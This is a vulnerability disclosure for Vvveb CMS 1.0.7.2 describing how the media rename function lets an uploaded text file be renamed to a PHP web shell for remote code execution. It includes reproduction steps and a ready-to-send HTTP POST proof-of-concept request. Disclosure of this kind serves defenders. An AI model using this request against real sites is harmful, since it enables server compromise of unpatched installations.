# Vendor

Vvveb

# Product

Vvveb

# version

1.0.7.2

# Download 

https://github.com/givanz/Vvveb

# Vulnerability

Vvveb CMS latest version 1.0.7.2 has a vulnerability caused by arbitrary file upload.

# Description

In Vvveb CMS latest version 1.0.7.2 (Vvveb1.0.7.2/system/traits/media.php) , users can directly rename the file, and there is no restriction on the file suffix. Then upload a file with normal suffix such as txt, and then rename it to a php file to RCE.

# Analysis
Audits find that Vvveb1.0.7.2/system/traits/media.php

Code analysis: 
1. The function receives the `file` and `newfile` parameters passed by the user.
2. 2. The function directly calls PHP's `rename()` function. Here is the root cause of the vulnerability: the code did not perform any validation on the extension of `$newfile` before performing the renaming. It does not have a blacklisting mechanism like the `upload()` function. 
3. This defect allows any existing file to be renamed to any file name, including `shell.php`.
<img width="911" height="457" alt="image" src="https://github.com/user-attachments/assets/36bdfd22-54b0-4b83-9ace-3c93f26d3296" />

We reappear the vulnerability:First, we upload a txt file, the file content is a script that executes the command

<img width="1030" height="591" alt="image" src="https://github.com/user-attachments/assets/57e3caf1-f828-4008-98f4-1e1e8f3658ec" />

Next we rename the uploaded shell.txt to shell.php

<img width="1029" height="430" alt="image" src="https://github.com/user-attachments/assets/379a9604-6269-4408-9219-9820fad2c8ef" />

Now let's access the uploaded php file and you can RCE.

<img width="907" height="288" alt="image" src="https://github.com/user-attachments/assets/f7e58119-b292-4d8d-b8cc-c818e3125ef8" />


# POC
```
POST /admin/index.php?module=media/media&action=rename HTTP/1.1
Host: 192.168.1.88:8083
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 32
Cookie: PHPSESSID=plaof0rngo8iic71ulcutjtkek; admin=1
Connection: close

file=shell.txt&newfile=shell.php
```



